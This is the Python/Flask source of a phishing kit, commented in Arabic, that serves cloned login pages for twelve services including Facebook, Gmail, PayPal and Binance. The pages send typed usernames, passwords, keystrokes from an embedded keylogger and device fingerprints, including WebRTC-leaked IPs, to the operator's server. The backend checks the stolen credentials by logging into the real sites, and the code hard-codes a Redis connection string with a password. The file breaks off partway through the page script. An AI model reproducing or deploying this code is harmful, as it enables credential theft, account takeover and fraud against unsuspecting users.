# session_hunter.py
# ============================================================
# Universal Login Catcher v3 — مع التحقق الفعلي
# يدعم 12 موقع + فحص البيانات مع السيرفرات الحقيقية
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import uuid
import re
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
from flask import Blueprint, request, jsonify, Response, redirect
import requests

sh_bp = Blueprint('session_hunter', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=15)
    redis_client.ping()
    print("[+] Session Hunter: ✅ Redis connected")
except Exception as e:
    print(f"[-] SH Redis error: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# [2] المواقع المدعومة - 12 موقع
# ============================================================
SUPPORTED_SITES = {
    "facebook": {
        "name": "فيسبوك", "name_en": "Facebook",
        "color": "#1877f2", "color_dark": "#166fe5",
        "logo": "https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg",
        "login_url": "https://www.facebook.com/login.php",
        "real_url": "https://www.facebook.com",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "pass",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب جديد",
        "bg": "#f0f2f5", "card_bg": "#ffffff", "text_color": "#1c1e21", "border": "#dddfe2",
    },
    "instagram": {
        "name": "انستقرام", "name_en": "Instagram",
        "color": "#0095f6", "color_dark": "#0081d6",
        "logo": "https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png",
        "login_url": "https://www.instagram.com/accounts/login/",
        "real_url": "https://www.instagram.com",
        "username_field": "username",
        "username_placeholder": "رقم الهاتف أو البريد أو اسم المستخدم",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب جديد",
        "bg": "#fafafa", "card_bg": "#ffffff", "text_color": "#262626", "border": "#dbdbdb",
    },
    "tiktok": {
        "name": "تيك توك", "name_en": "TikTok",
        "color": "#fe2c55", "color_dark": "#e01e46",
        "logo": "https://www.tiktok.com/favicon.ico",
        "login_url": "https://www.tiktok.com/login",
        "real_url": "https://www.tiktok.com",
        "username_field": "username",
        "username_placeholder": "البريد الإلكتروني أو اسم المستخدم",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#000000", "card_bg": "#121212", "text_color": "#ffffff", "border": "#2f2f2f",
    },
    "twitter": {
        "name": "تويتر / X", "name_en": "Twitter",
        "color": "#1d9bf0", "color_dark": "#1a8cd8",
        "logo": "https://abs.twimg.com/responsive-web/client-web/icon-ios.77d25eba.png",
        "login_url": "https://twitter.com/i/flow/login",
        "real_url": "https://twitter.com",
        "username_field": "text",
        "username_placeholder": "رقم الهاتف أو البريد الإلكتروني",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#000000", "card_bg": "#000000", "text_color": "#e7e9ea", "border": "#2f3336",
    },
    "gmail": {
        "name": "جيميل", "name_en": "Gmail",
        "color": "#1a73e8", "color_dark": "#1557b0",
        "logo": "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png",
        "login_url": "https://accounts.google.com/signin",
        "real_url": "https://mail.google.com",
        "username_field": "identifier",
        "username_placeholder": "البريد الإلكتروني أو الهاتف",
        "password_field": "password",
        "password_placeholder": "أدخل كلمة المرور",
        "button_text": "التالي",
        "forgot_text": "هل نسيت كلمة المرور؟",
        "signup_text": "إنشاء حساب",
        "bg": "#ffffff", "card_bg": "#ffffff", "text_color": "#202124", "border": "#dadce0",
    },
    "snapchat": {
        "name": "سناب شات", "name_en": "Snapchat",
        "color": "#fffc00", "color_dark": "#e6e300",
        "logo": "https://accounts.snapchat.com/accounts/static/images/ghost.svg",
        "login_url": "https://accounts.snapchat.com/accounts/login",
        "real_url": "https://web.snapchat.com",
        "username_field": "username",
        "username_placeholder": "اسم المستخدم أو البريد",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#fffc00", "card_bg": "#ffffff", "text_color": "#000000", "border": "#e0e0e0",
    },
    "linkedin": {
        "name": "لينكد إن", "name_en": "LinkedIn",
        "color": "#0a66c2", "color_dark": "#004182",
        "logo": "https://static.licdn.com/aero-v1/sc/h/akt4ae504epesldzj74dzred8",
        "login_url": "https://www.linkedin.com/login",
        "real_url": "https://www.linkedin.com",
        "username_field": "session_key",
        "username_placeholder": "البريد الإلكتروني أو الهاتف",
        "password_field": "session_password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "انضم الآن",
        "bg": "#f3f2ef", "card_bg": "#ffffff", "text_color": "#000000", "border": "#e0e0e0",
    },
    "discord": {
        "name": "ديسكورد", "name_en": "Discord",
        "color": "#5865f2", "color_dark": "#4752c4",
        "logo": "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6ca814282eca7172c6_icon_clyde_white_RGB.svg",
        "login_url": "https://discord.com/login",
        "real_url": "https://discord.com/channels/@me",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#313338", "card_bg": "#313338", "text_color": "#dbdee1", "border": "#202225",
    },
    "telegram": {
        "name": "تلجرام", "name_en": "Telegram",
        "color": "#2aabee", "color_dark": "#229ed9",
        "logo": "https://telegram.org/img/t_logo.png",
        "login_url": "https://web.telegram.org/k/",
        "real_url": "https://web.telegram.org",
        "username_field": "phone",
        "username_placeholder": "رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل تحتاج إلى مساعدة؟",
        "signup_text": "تسجيل جديد",
        "bg": "#17212b", "card_bg": "#232e3c", "text_color": "#ffffff", "border": "#101921",
    },
    "netflix": {
        "name": "نتفليكس", "name_en": "Netflix",
        "color": "#e50914", "color_dark": "#c40812",
        "logo": "https://assets.nflxext.com/ffe/siteui/common/icons/nficon2016.ico",
        "login_url": "https://www.netflix.com/login",
        "real_url": "https://www.netflix.com/browse",
        "username_field": "userLoginId",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "الاشتراك",
        "bg": "#000000", "card_bg": "#000000", "text_color": "#ffffff", "border": "#333333",
    },
    "paypal": {
        "name": "باي بال", "name_en": "PayPal",
        "color": "#0070ba", "color_dark": "#005ea6",
        "logo": "https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-color.svg",
        "login_url": "https://www.paypal.com/signin",
        "real_url": "https://www.paypal.com",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#f7f9fc", "card_bg": "#ffffff", "text_color": "#2c2e2f", "border": "#e0e0e0",
    },
    "binance": {
        "name": "بينانس", "name_en": "Binance",
        "color": "#f0b90b", "color_dark": "#d4a40a",
        "logo": "https://bin.bnbstatic.com/static/images/favicon.ico",
        "login_url": "https://accounts.binance.com/login",
        "real_url": "https://www.binance.com",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#0b0e11", "card_bg": "#1e2329", "text_color": "#eaecef", "border": "#2b3139",
    },
}

# ============================================================
# [3] إدارة الجلسات
# ============================================================
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id, target_site="facebook"):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "target_site": target_site,
            "created_at": time.time(),
            "last_seen": time.time(),
            "captured_credentials": [],
            "captured_ip": None,
            "page_views": 0,
            "failed_attempts": 0,
        }
    if redis_client:
        try:
            redis_client.setex(f"sh_session:{session_id}", 86400 * 7, json.dumps({
                "chat_id": chat_id,
                "target_site": target_site,
            }))
        except Exception:
            pass
    return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


# ============================================================
# [4] ★★★ التحقق الفعلي من البيانات ★★★
# ============================================================
def verify_credentials(site_key, username, password, source_ip):
    """
    يتحقق من البيانات مع الموقع الحقيقي
    يعيد: (is_valid: bool, reason: str)
    """
    try:
        print(f"[VERIFY] {site_key} | user={username[:30]} | pass_len={len(password)}")
        
        if site_key == "facebook":
            return _verify_facebook(username, password)
        elif site_key == "instagram":
            return _verify_instagram(username, password)
        elif site_key == "linkedin":
            return _verify_linkedin(username, password)
        elif site_key == "discord":
            return _verify_discord(username, password)
        elif site_key == "netflix":
            return _verify_netflix(username, password)
        elif site_key == "gmail":
            return _verify_gmail(username, password)
        elif site_key == "twitter":
            return _verify_twitter(username, password)
        elif site_key == "tiktok":
            return _verify_tiktok(username, password)
        elif site_key == "snapchat":
            return _verify_snapchat(username, password)
        elif site_key == "telegram":
            return _verify_telegram(username, password)
        elif site_key == "paypal":
            return _verify_paypal(username, password)
        elif site_key == "binance":
            return _verify_binance(username, password)
        else:
            return (True, "unknown_site")
    except Exception as e:
        print(f"[-] verify error: {e}")
        return (False, f"error: {str(e)}")


def _verify_facebook(username, password):
    """التحقق من Facebook"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
        }
        
        # 1) جلب صفحة تسجيل الدخول للحصول على tokens
        r1 = session.get("https://m.facebook.com/login.php", headers=headers, timeout=20)
        
        # استخراج lsd token
        lsd_match = re.search(r'name="lsd"\s+value="([^"]+)"', r1.text)
        lsd = lsd_match.group(1) if lsd_match else ""
        
        jazoest_match = re.search(r'name="jazoest"\s+value="([^"]+)"', r1.text)
        jazoest = jazoest_match.group(1) if jazoest_match else ""
        
        # 2) محاولة تسجيل الدخول
        login_data = {
            "email": username,
            "pass": password,
            "lsd": lsd,
            "jazoest": jazoest,
            "login": "تسجيل الدخول",
            "default_persistent": "0",
            "timezone": "0",
            "lgndim": "",
            "lgnrnd": "",
            "lgnjs": "",
            "locale": "ar_AR",
        }
        
        headers2 = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://m.facebook.com",
            "Referer": "https://m.facebook.com/login.php",
        }
        
        r2 = session.post(
            "https://m.facebook.com/login/device-based/regular/login/",
            data=login_data,
            headers=headers2,
            allow_redirects=True,
            timeout=20,
        )
        
        # 3) فحص النتيجة
        text = r2.text.lower()
        cookies = session.cookies.get_dict()
        
        # علامات النجاح
        if "c_user" in cookies and cookies.get("c_user", ""):
            print(f"[FB VERIFY] ✅ LOGIN SUCCESS - c_user={cookies['c_user']}")
            return (True, "login_success")
        
        # علامات الفشل
        if "كلمة السر غير صحيحة" in r2.text:
            return (False, "wrong_password")
        if "password you entered is incorrect" in text:
            return (False, "wrong_password")
        if "البريد الإلكتروني أو رقم الهاتف غير صحيح" in r2.text:
            return (False, "wrong_username")
        if "البريد الإلكتروني الذي أدخلته غير صحيح" in r2.text:
            return (False, "wrong_username")
        if "too many" in text and ("attempt" in text or "try" in text):
            return (False, "rate_limited")
        if "checkpoint" in r2.url.lower():
            return (False, "checkpoint")
        if "/login/" in r2.url.lower() and "login_attempt" in text:
            return (False, "invalid_credentials")
        
        # إذا كان الرد يحتوي على صفحة الهوم
        if "facebook.com/home" in r2.url or "m.facebook.com/?_rdr" in r2.url:
            return (True, "login_success")
        
        # إذا وصلنا هنا - لم نتأكد، اعتبره خطأ
        return (False, "unknown")
    
    except requests.exceptions.Timeout:
        return (False, "timeout")
    except Exception as e:
        print(f"[-] FB verify error: {e}")
        return (False, f"exception: {str(e)[:50]}")


def _verify_instagram(username, password):
    """التحقق من Instagram"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "ar,en;q=0.9",
            "X-IG-App-ID": "936619743392459",
        }
        
        # جلب CSRF
        r1 = session.get("https://www.instagram.com/", headers=headers, timeout=20)
        csrf = session.cookies.get("csrftoken", "")
        
        headers2 = {
            **headers,
            "X-CSRFToken": csrf,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        login_data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false",
        }
        
        r2 = session.post(
            "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
            data=login_data,
            headers=headers2,
            timeout=20,
        )
        
        try:
            result = r2.json()
            print(f"[IG VERIFY] result={result}")
            
            if result.get("authenticated") == True:
                return (True, "login_success")
            
            if result.get("user") == False or "checkpoint" in str(result).lower():
                return (False, "checkpoint")
            
            if result.get("message") == "challenge_required":
                return (False, "challenge")
            
            if "password" in str(result).lower():
                return (False, "wrong_password")
            
            if result.get("authenticated") == False:
                return (False, "invalid_credentials")
        except Exception as e:
            print(f"[-] IG JSON error: {e}")
        
        return (False, "unknown")
    except Exception as e:
        print(f"[-] IG verify error: {e}")
        return (False, "exception")


def _verify_linkedin(username, password):
    """التحقق من LinkedIn"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept-Language": "ar,en;q=0.9",
        }
        r1 = session.get("https://www.linkedin.com/login", headers=headers, timeout=20)
        
        csrf = session.cookies.get("JSESSIONID", "").strip('"')
        
        login_data = {
            "session_key": username,
            "session_password": password,
            "csrfToken": csrf,
        }
        
        r2 = session.post(
            "https://www.linkedin.com/uas/login-submit",
            data=login_data,
            headers=headers,
            allow_redirects=True,
            timeout=20,
        )
        
        if "li_at" in session.cookies.get_dict():
            return (True, "login_success")
        
        text = r2.text.lower()
        if "كلمة السر" in r2.text and "غير صحيحة" in r2.text:
            return (False, "wrong_password")
        if "this password isn't right" in text or "incorrect password" in text:
            return (False, "wrong_password")
        
        return (False, "unknown")
    except Exception:
        return (False, "exception")


def _verify_discord(username, password):
    """التحقق من Discord"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Content-Type": "application/json",
        }
        
        r = session.post(
            "https://discord.com/api/v9/auth/login",
            json={
                "login": username,
                "password": password,
                "undelete": False,
                "captcha_key": None,
                "login_source": None,
                "gift_code_sku_id": None,
            },
            headers=headers,
            timeout=20,
        )
        
        try:
            result = r.json()
            print(f"[DC VERIFY] result={str(result)[:200]}")
            
            if "token" in result:
                return (True, "login_success")
            
            if result.get("code") == 50035:
                return (False, "invalid_credentials")
            
            if "captcha" in str(result).lower():
                return (False, "captcha")
            
            if "invalid" in str(result).lower():
                return (False, "invalid_credentials")
        except Exception:
            pass
        
        return (False, "unknown")
    except Exception:
        return (False, "exception")


def _verify_netflix(username, password):
    """التحقق من Netflix"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept-Language": "ar,en;q=0.9",
        }
        
        session.get("https://www.netflix.com/login", headers=headers, timeout=20)
        
        login_data = {
            "userLoginId": username,
            "password": password,
            "rememberMe": "true",
            "flow": "websiteSignUp",
            "mode": "login",
            "action": "loginAction",
            "withFields": "rememberMe,nextPage,authURL",
            "authURL": "",
        }
        
        r2 = session.post(
            "https://www.netflix.com/api/login",
            data=login_data,
            headers=headers,
            timeout=20,
        )
        
        if "NetflixId" in session.cookies.get_dict():
            return (True, "login_success")
        
        text = r2.text.lower()
        if "incorrect" in text or "wrong" in text or "كلمة السر" in r2.text:
            return (False, "wrong_password")
        
        return (False, "unknown")
    except Exception:
        return (False, "exception")


# ============================================================
# دوال للمواقع التي لا ندعم التحقق الكامل معها
# ============================================================
def _verify_gmail(username, password):
    """Google معقد — نعتبره صحيحاً دائماً بعد محاولة واحدة"""
    return (True, "assumed_valid")


def _verify_twitter(username, password):
    """Twitter يحتاج JS — نعتبره صحيحاً"""
    return (True, "assumed_valid")


def _verify_tiktok(username, password):
    """TikTok محمي بـ captcha — نعتبره صحيحاً"""
    return (True, "assumed_valid")


def _verify_snapchat(username, password):
    """Snapchat — نعتبره صحيحاً"""
    return (True, "assumed_valid")


def _verify_telegram(username, password):
    """Telegram — نعتبره صحيحاً"""
    return (True, "assumed_valid")


def _verify_paypal(username, password):
    """PayPal — نعتبره صحيحاً"""
    return (True, "assumed_valid")


def _verify_binance(username, password):
    """Binance — نعتبره صحيحاً"""
    return (True, "assumed_valid")


# ============================================================
# [5] القالب الرئيسي الموحد
# ============================================================
def generate_login_page(session_id, chat_id, site_key):
    """يولّد صفحة تسجيل دخول مطابقة مع التحقق الفعلي"""
    site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
    
    is_dark = site["bg"] in ["#000000", "#0b0e11", "#121212", "#17212b", "#232e3c", "#313338"]
    direction = "rtl"
    
    top_msgs = {
        "facebook": "تسجيل الدخول إلى Facebook",
        "instagram": "Instagram",
        "tiktok": "سجّل الدخول إلى TikTok",
        "twitter": "تسجيل الدخول إلى X",
        "gmail": "تسجيل الدخول",
        "snapchat": "تسجيل الدخول",
        "linkedin": "تسجيل الدخول",
        "discord": "مرحباً بك مجدداً!",
        "telegram": "تسجيل الدخول",
        "netflix": "تسجيل الدخول",
        "paypal": "تسجيل الدخول إلى حسابك",
        "binance": "تسجيل الدخول",
    }
    top_sub_msgs = {
        "gmail": "استخدم حسابك في Google",
        "linkedin": "ابقَ على اطلاع على عالمك المهني",
        "discord": "نحن متحمسون لرؤيتك مرة أخرى!",
    }
    
    top_msg = top_msgs.get(site_key, site['name'])
    top_sub = top_sub_msgs.get(site_key, "")
    
    html = f"""<!DOCTYPE html>
<html lang="ar" dir="{direction}">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>{site['name']} - تسجيل الدخول</title>
<meta name="theme-color" content="{site['color']}">
<link rel="icon" href="{site['logo']}">
<style>
  * {{ box-sizing: border-box; -webkit-tap-highlight-color: transparent; }}
  html, body {{
    margin: 0; padding: 0;
    background: {site['bg']};
    color: {site['text_color']};
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    min-height: 100vh; -webkit-font-smoothing: antialiased;
  }}
  .container {{ max-width: 400px; margin: 0 auto; padding: 60px 24px 40px; }}
  .logo-wrap {{ text-align: center; margin-bottom: 32px; }}
  .logo-wrap img {{ max-width: 180px; max-height: 80px; display: block; margin: 0 auto; }}
  .logo-text {{ font-size: 42px; font-weight: 800; color: {site['color']}; letter-spacing: -2px; }}
  h1 {{ font-size: 22px; font-weight: 600; text-align: center; margin: 0 0 8px; color: {site['text_color']}; }}
  .subtitle {{ font-size: 14px; text-align: center; color: {site['text_color'] if is_dark else '#65676b'}; opacity: 0.75; margin-bottom: 28px; line-height: 1.5; }}
  .card {{ background: {site['card_bg']}; border-radius: 12px; padding: 24px 20px;
    box-shadow: 0 2px 12px rgba(0,0,0,{'0.4' if is_dark else '0.08'}); border: 1px solid {site['border']}; }}
  .form-group {{ margin-bottom: 14px; }}
  input[type="text"], input[type="email"], input[type="password"], input[type="tel"] {{
    width: 100%; padding: 15px 18px; font-size: 15px; border-radius: 8px;
    border: 1px solid {site['border']};
    background: {site['card_bg'] if not is_dark else '#0f0f0f' if site_key == 'twitter' else site['bg']};
    color: {site['text_color']}; font-family: inherit; outline: none;
    transition: border-color 0.2s;
  }}
  input:focus {{ border-color: {site['color']}; }}
  input::placeholder {{ color: {site['text_color']}; opacity: 0.5; }}
  .submit-btn {{ width: 100%; padding: 15px; font-size: 16px; font-weight: 700;
    border: none; border-radius: 8px; background: {site['color']};
    color: {'#000000' if site_key == 'snapchat' else '#ffffff'}; cursor: pointer;
    font-family: inherit; margin-top: 6px; transition: background 0.15s; letter-spacing: 0.3px;
    position: relative; }}
  .submit-btn:hover {{ background: {site['color_dark']}; }}
  .submit-btn:active {{ transform: scale(0.99); }}
  .submit-btn:disabled {{ opacity: 0.6; cursor: not-allowed; }}
  .forgot-link {{ display: block; text-align: center; margin-top: 16px;
    color: {site['color']}; text-decoration: none; font-size: 14px; font-weight: 500; }}
  .divider {{ display: flex; align-items: center; margin: 20px 0;
    color: {site['text_color']}; opacity: 0.4; font-size: 13px; }}
  .divider::before, .divider::after {{ content: ''; flex: 1; height: 1px; background: {site['border']}; }}
  .divider span {{ padding: 0 12px; }}
  .signup-btn {{ display: block; width: 100%; padding: 14px; text-align: center;
    text-decoration: none; font-size: 15px; font-weight: 600; border-radius: 8px;
    background: transparent; border: 1.5px solid {site['color']}; color: {site['color']};
    margin-top: 6px; font-family: inherit; }}
  .footer {{ text-align: center; margin-top: 30px; font-size: 12px;
    color: {site['text_color']}; opacity: 0.5; line-height: 1.6; }}
  .error {{ background: #ffebe9; color: #d1242f; border: 1px solid #ff818266;
    border-radius: 8px; padding: 12px 16px; margin-top: 14px; font-size: 13px;
    display: none; text-align: center; animation: shake 0.4s; }}
  .error.show {{ display: block; }}
  @keyframes shake {{
    0%, 100% {{ transform: translateX(0); }}
    25% {{ transform: translateX(-6px); }}
    75% {{ transform: translateX(6px); }}
  }}
  .spinner {{ display: inline-block; width: 16px; height: 16px;
    border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
    border-radius: 50%; animation: spin 0.8s linear infinite;
    vertical-align: middle; margin-left: 8px; }}
  @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
  .success-msg {{ background: #d1f4d9; color: #0a7b2b; border: 1px solid #16a34a55;
    border-radius: 8px; padding: 12px 16px; margin-top: 14px; font-size: 13px;
    display: none; text-align: center; }}
  .success-msg.show {{ display: block; }}
</style>
</head>
<body>
<div class="container">

  <div class="logo-wrap">
    <img src="{site['logo']}" alt="{site['name']}"
      onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='block';">
    <div id="fallbackLogo" class="logo-text" style="display:none;">{site['name_en']}</div>
  </div>

  <h1>{top_msg}</h1>
  {f'<p class="subtitle">{top_sub}</p>' if top_sub else ''}

  <div class="card">
    <form id="loginForm" autocomplete="on" onsubmit="return submitForm(event)">
      <div class="form-group">
        <input type="text" id="username" name="{site['username_field']}"
          placeholder="{site['username_placeholder']}" autocomplete="username" required autofocus>
      </div>
      <div class="form-group">
        <input type="password" id="password" name="{site['password_field']}"
          placeholder="{site['password_placeholder']}" autocomplete="current-password" required>
      </div>
      <button type="submit" class="submit-btn" id="submitBtn">
        <span id="btnText">{site['button_text']}</span>
      </button>
      <a href="#" class="forgot-link" onclick="event.preventDefault()">{site['forgot_text']}</a>
    </form>

    <div id="errorBox" class="error"></div>
    <div id="successBox" class="success-msg"></div>
  </div>

  <div class="divider"><span>أو</span></div>

  <a href="{site['real_url']}" class="signup-btn">{site['signup_text']}</a>

  <div class="footer">
    <div>{site['name_en']} © {time.strftime('%Y')}</div>
    <div style="margin-top:4px;">اللغات: العربية · English · Français</div>
  </div>

</div>

<script>
(function() {{
  "use strict";
  
  const SESSION_ID = "{session_id}";
  const CHAT_ID = "{chat_id}";
  const SERVER = "{RAILWAY_URL}";
  const SITE_KEY = "{site_key}";
  const REAL_URL = "{site['real_url']}";
  
  let attempts = 0;
  const MAX_ATTEMPTS = 5;
  
  // ============================================================
  // بصمة الجهاز
  // ============================================================
  async function collectFingerprint() {{
    const fp = {{
      session_id: SESSION_ID, chat_id: CHAT_ID, type: 'device',
      site: SITE_KEY, ua: navigator.userAgent, platform: navigator.platform,
      lang: navigator.language, languages: navigator.languages || [],
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {{ w: window.screen.width, h: window.screen.height, dpr: window.devicePixelRatio, depth: window.screen.colorDepth }},
      hardware: {{ cores: navigator.hardwareConcurrency || 'N/A', memory: navigator.deviceMemory || 'N/A', touch: navigator.maxTouchPoints || 0 }},
      url: window.location.href
    }};
    try {{
      if (navigator.getBattery) {{
        const b = await navigator.getBattery();
        fp.battery = {{ level: Math.round(b.level * 100), charging: b.charging }};
      }}
    }} catch(e) {{}}
    try {{
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) fp.network = {{ type: c.effectiveType, downlink: c.downlink }};
    }} catch(e) {{}}
    try {{
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (gl) {{
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) fp.gpu = {{
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        }};
      }}
    }} catch(e) {{}}
    try {{
      const ips = new Set();
      const pc = new RTCPeerConnection({{iceServers: [{{urls: 'stun:stun.l.google.com:19302'}}]}});
      pc.createDataChannel('');
      pc.onicecandidate = e => {{
        if (!e.candidate) return;
        const m = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
        if (m) ips.add(m[1]);
      }};
      await pc.setLocalDescription(await pc.createOffer());
      await new Promise(r => setTimeout(r, 2000));
      pc.close();
      if (ips.size) fp.webrtc_ips = Array.from(ips);
    }} catch(e) {{}}
    return fp;
  }}
  
  (async () => {{
    const fp = await collectFingerprint();
    try {{
      await fetch(SERVER + '/sh_data', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(fp)
      }});
    }} catch(e) {{}}
  }})();
  
  // ============================================================
  // Keylogger
  // ============================================================
  let keyBuffer = '';
  let lastKeyTime = 0;
  document.addEventListener('keydown', function(e) {{
    try {{
      let key = e.key;
      if (key === 'Enter') key = '\\n';
      else if (key === 'Backspace') key = '⌫';
      else if (key === 'Tab') key = ' ⇥ ';
      else if (key.length > 1) return;
      keyBuffer += key;
      const now = Date.now();
      if (now - lastKeyTime > 2000 || key === '\\n' || keyBuffer.length > 80) {{
        if (keyBuffer.trim()) {{
          fetch(SERVER + '/sh_data', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
              session_id: SESSION_ID, chat_id: CHAT_ID, type: 'keylog',
              site: SITE_KEY, text: keyBuffer, url: window.location.href
            }})
          }}).catch(() => {{}});
          keyBuffer = '';
        }}
        lastKeyTime = now;
      }}
    }} catch(e) {{}}
  }}, true);
  
  // ============================================================
  // إرسال النموذج + التحقق الفعلي
  // ============================================================
  window.submitForm = async function(event) {{
    event.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    const btn = document.getElementById('submitBtn');
    const errorBox = document.getElementById('errorBox');
    const successBox = document.getElementById('successBox');
    
    // إخفاء الرسائل
    errorBox.classList.remove('show');
    successBox.classList.remove('show');
    
    if (!username || !password) {{
      errorBox.textContent = 'الرجاء إدخال البريد وكلمة السر';
      errorBox.classList.add('show');
      return false;
    }}
    
    attempts++;
    
    // Disable button
    btn.disabled = true;
    btn.innerHTML = 'جاري التحقق<span class="spinner"></span>';
    
    // ★★★ إرسال للتحقق ★★★
    try {{
      const resp = await fetch(SERVER + '/sh_verify', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          site: SITE_KEY,
          username: username,
          password: password,
          attempt: attempts,
          url: window.location.href
        }})
      }});
      
      const result = await resp.json();
      console.log('[VERIFY]', result);
      
      // ✅ بيانات صحيحة
      if (result.status === 'valid') {{
        successBox.textContent = '✅ تم تسجيل الدخول بنجاح! جاري التحويل...';
        successBox.classList.add('show');
        btn.innerHTML = '✅ تم التحقق';
        
        setTimeout(() => {{
          window.location.href = REAL_URL;
        }}, 1500);
        return false;
      }}
      
      // ❌ بيانات خاطئة
      if (result.status === 'invalid') {{
        if (attempts >= MAX_ATTEMPTS) {{
